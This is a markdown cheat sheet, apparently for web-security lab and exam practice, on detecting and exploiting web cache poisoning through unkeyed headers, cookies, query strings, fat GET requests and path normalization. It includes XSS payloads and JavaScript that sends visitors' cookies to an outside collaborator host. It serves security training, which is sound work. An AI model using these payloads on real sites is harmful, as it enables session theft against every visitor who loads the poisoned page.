# Web Cache Poisoning - Stage 1

## 🎯 Identification

### Key Indicators
1. **File:** `/resources/js/tracking.js` exists
2. **Header:** `X-Cache: hit` in response

**If you see BOTH** → Web cache poisoning is likely possible!

## 🔍 Detection Method

### Step 1: Look for tracking.js
```http
GET / HTTP/1.1
Host: vulnerable-site.com
```

**Check response for:**
```html
<script src="/resources/js/tracking.js"></script>
```

### Step 2: Check for Cache Headers
```http
HTTP/1.1 200 OK
X-Cache: hit
Age: 35
```

## 🔥 Exploitation

### Basic Attack Flow

#### 1. Find Unkeyed Input
Test headers that might not be part of cache key:
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

#### 2. Check Response
Look for your input reflected:
```html
<script src="//exploit-server.com/resources/js/tracking.js"></script>
```

#### 3. Set Up Exploit Server
**File:** `/resources/js/tracking.js`

**Body:**
```javascript
document.location='http://burp.oastify.com/?c='+document.cookie
```

Or:
```javascript
document.write('<img src="http://burp.oastify.com?c='+document.cookie+'" />')
```

#### 4. Poison the Cache
**IMPORTANT:** Send the poisoned request **multiple times** (10+ times) until cache is poisoned.

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

Keep sending until you see `X-Cache: hit` with your poisoned content.

#### 5. Wait for Victim
Once cache is poisoned, any visitor will execute your JavaScript.

## 📋 Lab Techniques

### Lab 1: Unkeyed Header
**Unkeyed Input:** `X-Forwarded-Host`

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

---

### Lab 2: Unkeyed Cookie
**Unkeyed Input:** Cookie value

```http
GET / HTTP/1.1
Host: vulnerable-site.com
Cookie: session=abc; featureFlag=1"><script>alert(1)</script>
```

---

### Lab 3: Multiple Headers
**Unkeyed Inputs:** Multiple headers combined

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
X-Forwarded-Scheme: nothttps
```

---

### Lab 4: Unknown Header
**Discovery:** Use Param Miner extension

```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Host: exploit-server.com
```

---

### Lab 5: Unkeyed Query String
**Unkeyed Input:** Entire query string

```http
GET /?evil='/><script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
```

---

### Lab 6: Unkeyed Query Parameter
**Unkeyed Input:** Specific parameter

```http
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
Host: vulnerable-site.com
```

---

### Lab 7: Parameter Cloaking
**Technique:** Hide parameter using parsing discrepancies

```http
GET /?utm_content=x;callback=alert(1)// HTTP/1.1
Host: vulnerable-site.com
```

---

### Lab 8: Fat GET Request
**Technique:** GET request with body

```http
GET /?callback=setCountry HTTP/1.1
Host: vulnerable-site.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 53

callback=alert(1)//&csrf=token&country=UK
```

---

### Lab 9: URL Normalization
**Technique:** Exploit path normalization

```http
GET /random/../resources/js/tracking.js HTTP/1.1
Host: vulnerable-site.com
X-Forwarded-Host: exploit-server.com
```

## 🛠️ Tools

### Param Miner (Burp Extension)
- Automatically discovers unkeyed inputs
- Tests various cache poisoning vectors
- Essential for finding hidden headers

**Usage:**
1. Right-click request → Extensions → Param Miner → Guess headers
2. Wait for results
3. Test identified unkeyed inputs

## 🎓 Exam Tips

1. **Look for tracking.js + X-Cache: hit** - Both must be present
2. **Send poisoned request 10+ times** - Cache needs multiple hits
3. **Use Param Miner** - Finds hidden unkeyed inputs
4. **Test common headers first:**
   - `X-Forwarded-Host`
   - `X-Host`
   - `X-Forwarded-Scheme`
   - `X-Original-URL`
5. **Set up exploit server properly** - Correct path and payload
6. **Be patient** - Cache poisoning takes time

## 🔍 Testing Checklist

- [ ] Check for `/resources/js/tracking.js`
- [ ] Verify `X-Cache: hit` header
- [ ] Test `X-Forwarded-Host` header
- [ ] Test other common headers
- [ ] Run Param Miner
- [ ] Set up exploit server with tracking.js
- [ ] Poison cache (send 10+ requests)
- [ ] Verify cache is poisoned
- [ ] Wait for victim access

## 📚 References

- [PortSwigger Web Cache Poisoning](https://portswigger.net/web-security/web-cache-poisoning)
- [Param Miner Extension](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)
